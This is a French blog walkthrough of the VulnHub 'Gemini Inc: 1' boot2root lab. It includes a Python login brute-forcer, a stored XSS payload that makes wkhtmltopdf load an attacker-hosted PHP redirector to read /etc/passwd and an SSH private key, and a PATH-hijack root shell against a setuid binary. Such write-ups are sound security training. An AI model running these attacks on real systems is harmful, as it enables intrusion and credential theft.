# Solution du CTF Gemini Inc: 1 de VulnHub

Créé par [sec 9emin1](https://twitter.com/@sec_9emin1), [ce CTF](https://www.vulnhub.com/entry/gemini-inc-1,227/) se présente comme un cas rencontré lors d'un pentest, donc réaliste.  

Il n'en fallait pas plus pour attirer ma curiosité.  

1 2 3 4 je me connecte en admin
-------------------------------

```plain
Nmap scan report for 192.168.2.3
Host is up (0.00054s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)
| ssh-hostkey:
|   2048 e9:e3:89:b6:3b:ea:e4:13:c8:ac:38:44:d6:ea:c0:e4 (RSA)
|_  256 8c:19:77:fd:36:72:7e:34:46:c4:29:2d:2a:ac:15:98 (ECDSA)
80/tcp open  http    Apache httpd 2.4.25
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2018-01-07 08:35  test2/
|_
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Index of /
MAC Address: 08:00:27:65:AA:CA (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.0
Network Distance: 1 hop
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Le scan n'a rien de bien original. On se retrouve vite sur l'appli web PHP à l'adresse */test2/* qui est une version modifiée [de ce projet](https://github.com/ionutvmi/master-login-system) (l'auteur du challenge a laissé une référence).  

J'en profite pour lancer un buster afin de trouver d'autres scripts éventuels :  

```plain
[*] Launching module buster
Found webpage http://192.168.2.3/test2/css
Found webpage http://192.168.2.3/test2/js
Found webpage http://192.168.2.3/test2/index.php
Found webpage http://192.168.2.3/test2/img
Found webpage http://192.168.2.3/test2/lib
Found webpage http://192.168.2.3/test2/user.php
Found webpage http://192.168.2.3/test2/header.php
Found webpage http://192.168.2.3/test2/footer.php
Found webpage http://192.168.2.3/test2/favicon.ico
Found webpage http://192.168.2.3/test2/inc
Found webpage http://192.168.2.3/test2/profile.php
Found webpage http://192.168.2.3/test2/logout.php
Found webpage http://192.168.2.3/test2/export.php
Found webpage http://192.168.2.3/test2/validate.php
```

J'aime bien jeter un coup d’œil aux entêtes des scripts de déconnexion car ils sont parfois verbeux sur les cookies qu'ils suppriment (quand bien même les cookies n'ont pas été créés auparavant):   

```plain
$ curl -D- http://192.168.2.3/test2/logout.php
HTTP/1.1 302 Found
Date: Sun, 11 Mar 2018 15:05:15 GMT
Server: Apache/2.4.25 (Debian)
Set-Cookie: PHPSESSID=bhod6l3421raocr9gli8baq3o0; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: user=0; expires=Mon, 12-Feb-2018 15:05:15 GMT; Max-Age=0; path=/
Set-Cookie: pass=0; expires=Mon, 12-Feb-2018 15:05:15 GMT; Max-Age=0; path=/
Location: /
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

Ici ça paye car on voit deux clés user et pass. Malgré cela ils ne semblent pas permettre de bypasser l'authentification ni provoquer une injection SQL...  

Le script d'export nous retourne vraisemblablement la page de profil de l'utilisateur *admin* au format PDF :  

```plain
$ curl -D- http://192.168.2.3/test2/export.php
HTTP/1.1 200 OK
Date: Sun, 11 Mar 2018 15:05:57 GMT
Server: Apache/2.4.25 (Debian)
Content-Disposition: inline; filename=profile.pdf
Transfer-Encoding: chunked
Content-Type: application/pdf

%PDF-1.4
1 0 obj
<<
/Title (��Profile of admin)
/Creator (��wkhtmltopdf 0.12.4)
/Producer (��Qt 4.8.7)
/CreationDate (D:20180311110557-04'00')
>>
```

On voit ici que la génération semble se faire par un outil baptisé *wkhtmltopdf*.  

Après avoir cherché des paramètres à passer à *export.php* pour lui faire cracher des donnés différentes, je suis passé sur le bruteforce de la page de login de l'application.  

Cela est compliqué par la présence d'un token généré aléatoirement à chaque tentative, il faut donc l'extraire de la page pour chaque requête :  

```python
import sys
import requests
from bs4 import BeautifulSoup

sess = requests.session()
response = sess.get("http://192.168.2.3/test2/login.php")
soup = BeautifulSoup(response.text, "lxml")
token = soup.find("input", attrs={"name": "token"})["value"]

USER_FILE = sys.argv[1]
PASS_FILE = sys.argv[2]

with open(USER_FILE) as fd:
    for user in fd:
        user = user.strip()

        with open(PASS_FILE) as fd2:
            for password in fd2:
                password = password.strip()

                response = sess.post(
                    "http://192.168.2.3/test2/login.php",
                    data={
                        "name": user,
                        "password": password,
                        "token": token
                        }
                )
                if "Username or password are wrong" not in response.text:
                    print("No fail login message with creds {} / {}".format(user, password))
                    sess = requests.session()
                    response = sess.get("http://192.168.2.3/test2/login.php")

                soup = BeautifulSoup(response.text, "lxml")
                try:
                    token = soup.find("input", attrs={"name": "token"})["value"]
                except Exception:
                    print("No token field found with creds {} / {}".format(user, password))
                    print(response.status_code)
                    print(response.text)
                    exit()
```

Je met quelques noms d'utilisateurs (guest, demo, admin, test, etc) dans une wordlist et la pèche se termine aussitôt :  

```plain
$ python3 brute.py users.txt /opt/wordlists/top500.txt
No fail login message with creds admin / 1234
```

5 6 7 8 pour dumper tes fichiers
--------------------------------

Une fois connecté en admin on ne gagne qu'un formulaire pour éditer ses informations (*edit.php*).  

Toutefois il y a un champ *Display name* dans le formulaire qui est vulnérable à un XSS permanent (stocké). Le code HTML est alors interprété dans le script *profile.php* ou dans le *export.php* (le PDF est généré via le moteur de rendu WebKit).  

Exploiter le XSS dans *profile.php* ne nous est d'aucune utilité en revanche on peut jouer avec le *wkhtmltopdf* et tenter de lui faire rendre des informations particulières.  

J'avais déjà vu un cas d'exploitation similaire, je n'ai pas trouvé la référence originale (qui avait du être partagée via */r/NetSec*) mais il y a par exemple [cette ressource](https://securityonline.info/export-injection-new-server-side-vulnerability/) sur le sujet.  

J'ai d'abord essayé d'injecter une iframe dont la source est *file:///etc/passwd* mais la frame résultante dans le PDF était vide.  

J'ai ensuite tenté d'utiliser du code Javascript pour que le navigateur ouvre /etc/passwd (*document.href = 'file:///etc/passwd'*), toujours sans résultat.  

Enfin j'ai créé le script *index.php* suivant qui redirige vers le fichier */etc/passwd* et lancé un serveur web PHP minimaliste avec *php -S 0.0.0.0:8888* :  

```php
<?php
$filename = $_GET["file"];
header("Location: file://$filename");
?>
```

et en injectant le code HTML suivant dans le *Display name* :  

```html
<iframe height="1000" width="1000" src="http://192.168.2.240:8888/?file=/etc/passwd"></iframe>
```

On obtient enfin le fichier attendu :  

![Gemini CTF /etc/passwd dump](https://raw.githubusercontent.com/devl00p/blog/master/images/gemini_etc_passwd.png)

Je trouve facilement le fichier où sont stockés les identifiants SQL de l'appli (avec le Github c'est pas trop compliqué) :  

![Gemini CTF SQL credentials dump](https://raw.githubusercontent.com/devl00p/blog/master/images/gemini_settings_php.png)

Mais ceux-çi s'avèrent inutiles. On a plus de chances en dumpant le contenu de */home/gemini1/.ssh/id\_rsa* qui nous offre un accès SSH :)  

9 10 11 12 pour passer root
---------------------------

Grace aux identifiants SQL je cherche un compte en base (c'est un serveur MariaDB) mais je ne trouve qu'un compte *demo* et un hash vite cassé en *demodemo* :(   

Le serveur Apache tourne avec le user *gemini1* (via l'entrée *export APACHE\_RUN\_USER=gemini1* dans le fichier *envvars*) et le binaire */usr/bin/wkhtmltopdf* appartient aussi à cet utilisateur... mais ça nous fait une belle jambe :|   

Finalement après avoir listé les binaires setuid pour la seconde fois il y en a un qui me fait plus tilter que les autres (j'ai d'abord pensé à un programme lié à Exim) :  

```plain
-rwsr-xr-x 1 root root 8792 Jan  7 06:10 /usr/bin/listinfo
```

Effectivement le binaire semble être fait maison :  

```plain
gemini1@geminiinc:/var/www$ /usr/bin/listinfo
displaying network information...            inet 192.168.2.3  netmask 255.255.255.0  broadcast 192.168.2.255
displaying network information...            inet6 fe80::a00:27ff:fe65:aaca  prefixlen 64  scopeid 0x20<link>
displaying network information...            inet 127.0.0.1  netmask 255.0.0.0
displaying network information...            inet6 ::1  prefixlen 128  scopeid 0x10<host>

displaying Apache listening port...    tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN

displaying Apache listening port...    tcp6       0      0 :::22                   :::*                    LISTEN

displaying SSH listening port...    tcp6       0      0 :::80                   :::*                    LISTEN

displaying current date...    Sun Mar 11 20:35:42 EDT 2018
```

Un appel à strings suffira à voir que certains programmes (date, grep) ne sont pas appelés via leurs paths complet :  

```plain
/sbin/ifconfig | grep inet
/bin/netstat -tuln | grep 22
/bin/netstat -tuln | grep 80
date
displaying network information...    
displaying Apache listening port...    
displaying SSH listening port...    
displaying current date...
```

J'ai opté pour un ELF qui nous offre un shell root :  

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(void)
{
  setuid(0);
  setgid(0);
  system("/bin/bash -p");
  return 0;
}
```

Compile, exécute et profite :  

```plain
gemini1@geminiinc:/tmp$ gcc -o date date.c 
gemini1@geminiinc:/tmp$ PATH=.:$PATH /usr/bin/listinfo
displaying network information...            inet 192.168.2.3  netmask 255.255.255.0  broadcast 192.168.2.255
displaying network information...            inet6 fe80::a00:27ff:fe65:aaca  prefixlen 64  scopeid 0x20<link>
displaying network information...            inet 127.0.0.1  netmask 255.0.0.0
displaying network information...            inet6 ::1  prefixlen 128  scopeid 0x10<host>

displaying Apache listening port...    tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN

displaying Apache listening port...    tcp6       0      0 :::22                   :::*                    LISTEN

displaying SSH listening port...    tcp6       0      0 :::80                   :::*                    LISTEN
root@geminiinc:/tmp# cp /root/flag.txt .
root@geminiinc:/tmp# chmod +r flag.txt
root@geminiinc:/tmp# exit
gemini1@geminiinc:/tmp$ cat flag.txt
mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm

Congratulations on solving this boot2root machine!
Cheers!
         _.._..,_,_
        (          )
         ]~,"-.-~~[
       .=])' (;  ([
       | ]:: '    [
       '=]): .)  ([
         |:: '    |
          ~~----~~
https://twitter.com/sec_9emin1
https://scriptkidd1e.wordpress.com

mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
```

Finish him
----------

C'était amusant d'avoir à faire à ce cas d'exploitation, même si le challenge était un peu court. J'espère d'autres CTF à venir dans la même série :)  


*Published March 15 2018 at 18:07*